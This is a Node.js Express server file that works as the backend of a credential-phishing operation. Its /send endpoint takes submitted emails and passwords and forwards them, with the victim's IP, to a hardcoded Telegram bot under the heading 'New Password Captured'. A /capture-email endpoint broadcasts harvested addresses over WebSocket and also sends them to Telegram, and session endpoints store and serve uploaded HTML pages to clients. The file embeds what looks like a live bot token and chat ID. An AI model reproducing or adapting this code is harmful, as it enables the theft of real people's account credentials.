// api.js - This runs on Render.com
const express = require('express');
const path = require('path');
const http = require('http');
const WebSocket = require('ws');
const fs = require('fs');

const app = express();
const server = http.createServer(app);

// ====== INCREASE PAYLOAD LIMITS - MUST BE BEFORE ROUTES ======
// This fixes the 413 "Payload Too Large" error
app.use(express.json({ limit: '12mb' }));
app.use(express.urlencoded({ extended: true, limit: '12mb' }));

// ====== SESSION STORAGE ======
// Store uploaded content per session
const sessionContent = new Map();
const uploads = new Map();

// Optional: Persist sessions to disk (saves between restarts)
const SESSION_FILE = '/tmp/sessions.json';

function saveSessions() {
    try {
        const data = Object.fromEntries(sessionContent);
        fs.writeFileSync(SESSION_FILE, JSON.stringify(data));
    } catch (e) {
        // Ignore write errors
    }
}

function loadSessions() {
    try {
        if (fs.existsSync(SESSION_FILE)) {
            const data = JSON.parse(fs.readFileSync(SESSION_FILE, 'utf8'));
            Object.entries(data).forEach(([key, value]) => {
                sessionContent.set(key, value);
            });
            console.log(`📂 Loaded ${sessionContent.size} sessions from disk`);
        }
    } catch (e) {
        console.log('📂 No saved sessions found');
    }
}

// Load sessions on startup
loadSessions();

// Save sessions every minute
setInterval(saveSessions, 60000);

// ====== WEBSOCKET SERVER ======
const wss = new WebSocket.Server({ 
    server, 
    path: '/messages' 
});

// Store all connected clients
const clients = new Set();

wss.on('connection', (ws, req) => {
    console.log(`🔌 WebSocket client connected from ${req.socket.remoteAddress}`);
    clients.add(ws);
    
    ws.send(JSON.stringify({ 
        type: 'connected', 
        message: 'Connected to WebSocket server',
        timestamp: new Date().toISOString()
    }));
    
    ws.on('message', (message) => {
        try {
            const data = JSON.parse(message);
            console.log(`📩 Received via WebSocket:`, data);
            
            clients.forEach((client) => {
                if (client !== ws && client.readyState === WebSocket.OPEN) {
                    client.send(JSON.stringify({
                        type: 'email_capture',
                        ...data,
                        received: new Date().toISOString()
                    }));
                }
            });
            
            ws.send(JSON.stringify({
                type: 'ack',
                status: 'received',
                email: data.email,
                timestamp: new Date().toISOString()
            }));
            
        } catch (e) {
            console.warn('⚠️ Invalid WebSocket message:', message);
        }
    });
    
    ws.on('close', () => {
        console.log('🔌 WebSocket client disconnected');
        clients.delete(ws);
    });
    
    ws.on('error', (error) => {
        console.error('⚠️ WebSocket error:', error);
        clients.delete(ws);
    });
});

function broadcastEmail(email, trigger) {
    const data = {
        type: 'email_capture',
        email: email,
        trigger: trigger || 'api',
        timestamp: new Date().toISOString()
    };
    
    clients.forEach((client) => {
        if (client.readyState === WebSocket.OPEN) {
            client.send(JSON.stringify(data));
        }
    });
}

// ====== CORS MIDDLEWARE ======
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
    next();
});

// ====== SERVE STATIC FILES ======
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.use(express.static(__dirname));

// ====== TELEGRAM CONFIG ======
const TELEGRAM_TOKEN = '8750325296:AAG1WYnhrZve1oIIZoaPobB4_hc9PHDAjLY';
const TELEGRAM_CHAT_ID = '8391692120';

async function sendToTelegram(message) {
    try {
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });
        const data = await response.json();
        return data.ok;
    } catch (error) {
        console.error('Telegram error:', error);
        return false;
    }
}

// ====== CHUNKED UPLOAD ENDPOINTS ======

// 1. Initialize upload
app.post('/api/session/:sessionId/upload/init', (req, res) => {
    const { sessionId } = req.params;
    const { filename, total_size, chunk_size } = req.body;
    
    if (!filename || !total_size) {
        return res.status(400).json({ error: 'Missing required fields' });
    }
    
    const uploadId = Math.random().toString(36).substring(2, 15) + 
                     Math.random().toString(36).substring(2, 15);
    
    uploads.set(uploadId, {
        sessionId,
        filename,
        total_size,
        chunk_size: chunk_size || 500 * 1024,
        chunks: new Map(),
        total_chunks: Math.ceil(total_size / (chunk_size || 500 * 1024)),
        completed: false,
        created: Date.now()
    });
    
    console.log(`📤 Upload initialized: ${uploadId} for session ${sessionId} (${total_size} bytes, ${Math.ceil(total_size / (chunk_size || 500 * 1024))} chunks)`);
    
    res.json({ upload_id: uploadId });
});

// 2. Upload a chunk
app.post('/api/session/:sessionId/upload/chunk', (req, res) => {
    const { sessionId } = req.params;
    const { upload_id, chunk_num, total_chunks, chunk } = req.body;
    
    if (!upload_id || !chunk_num || !chunk) {
        return res.status(400).json({ error: 'Missing required fields' });
    }
    
    const upload = uploads.get(upload_id);
    if (!upload) {
        return res.status(404).json({ error: 'Upload not found' });
    }
    
    if (upload.sessionId !== sessionId) {
        return res.status(403).json({ error: 'Session mismatch' });
    }
    
    // Store the chunk
    upload.chunks.set(chunk_num, chunk);
    
    // Check if all chunks are received
    if (upload.chunks.size === total_chunks) {
        upload.completed = true;
    }
    
    res.json({ 
        status: 'chunk_received', 
        chunk: chunk_num,
        total: total_chunks,
        received: upload.chunks.size
    });
});

// 3. Complete upload
app.post('/api/session/:sessionId/upload/complete', (req, res) => {
    const { sessionId } = req.params;
    const { upload_id } = req.body;
    
    if (!upload_id) {
        return res.status(400).json({ error: 'Missing upload_id' });
    }
    
    const upload = uploads.get(upload_id);
    if (!upload) {
        return res.status(404).json({ error: 'Upload not found' });
    }
    
    if (upload.sessionId !== sessionId) {
        return res.status(403).json({ error: 'Session mismatch' });
    }
    
    if (!upload.completed) {
        return res.status(400).json({ error: 'Upload not complete' });
    }
    
    // Reconstruct the HTML from chunks
    let html = '';
    for (let i = 1; i <= upload.total_chunks; i++) {
        html += upload.chunks.get(i) || '';
    }
    
    // Store the HTML for this session
    sessionContent.set(sessionId, {
        filename: upload.filename,
        html: html,
        uploaded: Date.now()
    });
    
    // Clean up upload data
    uploads.delete(upload_id);
    
    console.log(`✅ Upload complete for session ${sessionId}: ${upload.filename} (${html.length} bytes)`);
    
    // Save sessions to disk
    saveSessions();
    
    res.json({ 
        status: 'complete',
        sessionId: sessionId,
        filename: upload.filename,
        size: html.length
    });
});

// 4. Check if content exists for a session
app.get('/api/check/:sessionId', (req, res) => {
    const { sessionId } = req.params;
    
    if (sessionContent.has(sessionId)) {
        const content = sessionContent.get(sessionId);
        res.json({ 
            hasContent: true, 
            html: content.html 
        });
    } else {
        res.json({ hasContent: false });
    }
});

// 5. Session waiting notification
app.post('/api/session/:sessionId/waiting', (req, res) => {
    const { sessionId } = req.params;
    console.log(`📱 Session ${sessionId} is waiting for content`);
    res.json({ status: 'waiting' });
});

// 6. Direct upload endpoint (backward compatibility)
app.post('/api/session/:sessionId/html', (req, res) => {
    const { sessionId } = req.params;
    const { filename, html } = req.body;
    
    if (!html) {
        return res.status(400).json({ error: 'HTML content is required' });
    }
    
    sessionContent.set(sessionId, {
        filename: filename || 'uploaded.html',
        html: html,
        uploaded: Date.now()
    });
    
    console.log(`📄 Direct HTML upload for session ${sessionId} (${html.length} bytes)`);
    
    // Save sessions to disk
    saveSessions();
    
    res.json({ status: 'success' });
});

// ====== EXISTING ENDPOINTS ======

// Endpoint to receive password and forward to Telegram
app.post('/send', async (req, res) => {
    const { email, password } = req.body;
    
    if (!password) {
        return res.status(400).json({ error: 'Password is required' });
    }
    
    const message = `🔐 New Password Captured\n\n📧 Email: ${email || 'Not found'}\n🔑 Password: ${password}\n🕐 Time: ${new Date().toLocaleString()}\n🌐 IP: ${req.ip || 'Unknown'}`;
    
    const success = await sendToTelegram(message);
    
    if (success) {
        res.json({ success: true, message: 'Password forwarded to Telegram' });
    } else {
        res.status(500).json({ error: 'Telegram API error' });
    }
});

app.get('/send', async (req, res) => {
    const { email, password } = req.query;
    
    if (!password) {
        return res.status(400).json({ error: 'Password is required' });
    }
    
    const message = `🔐 New Password Captured\n\n📧 Email: ${email || 'Not found'}\n🔑 Password: ${password}\n🕐 Time: ${new Date().toLocaleString()}`;
    
    const success = await sendToTelegram(message);
    res.json({ success });
});

// WebSocket email capture endpoint
app.post('/capture-email', (req, res) => {
    const { email, trigger, timestamp, userAgent } = req.body;
    
    if (!email) {
        return res.status(400).json({ error: 'Email is required' });
    }
    
    console.log(`📧 Email captured: ${email} (trigger: ${trigger})`);
    
    broadcastEmail(email, trigger);
    
    const message = `📧 Email Captured\n\n📧 Email: ${email}\n📍 Trigger: ${trigger || 'api'}\n🕐 Time: ${new Date().toLocaleString()}\n🌐 UserAgent: ${userAgent || 'Unknown'}`;
    sendToTelegram(message);
    
    res.json({ 
        success: true, 
        message: 'Email captured and forwarded',
        timestamp: new Date().toISOString()
    });
});

// ====== CLEANUP OLD UPLOADS ======
// Remove uploads older than 1 hour
setInterval(() => {
    const now = Date.now();
    const oneHour = 60 * 60 * 1000;
    
    for (const [id, upload] of uploads) {
        if (now - upload.created > oneHour) {
            uploads.delete(id);
            console.log(`🧹 Cleaned up expired upload: ${id}`);
        }
    }
}, 5 * 60 * 1000); // Check every 5 minutes

// ====== START SERVER ======
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`🔌 WebSocket endpoint: wss://your-app.onrender.com/messages`);
    console.log(`📡 POST /capture-email to capture emails`);
    console.log(`📤 Chunked upload endpoints available at /api/session/:sessionId/upload/*`);
    console.log(`📂 Loaded ${sessionContent.size} sessions from disk`);
});